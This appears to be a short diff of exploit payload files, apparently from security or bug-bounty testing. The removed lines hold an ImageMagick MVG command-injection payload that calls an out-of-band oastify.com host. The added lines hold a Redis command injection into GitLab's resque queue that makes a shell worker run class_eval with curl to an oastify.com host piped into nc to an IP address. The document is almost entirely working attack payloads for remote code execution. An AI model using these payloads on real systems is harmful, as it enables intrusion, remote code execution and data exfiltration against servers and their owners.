@@ -1,4 +1,5 @@
-push graphic-context
-viewbox 0 0 640 480
-fill 'url(https://guewp38h5uyjm3cfloq9abw940ayyn.oastify.com/a";curl "127.0.0.1)'
-pop graphic-context
+A
+ multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|curl http://devt90seprig60wc5la6u8g6oxu1iq.oastify.com/a | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
+ exec
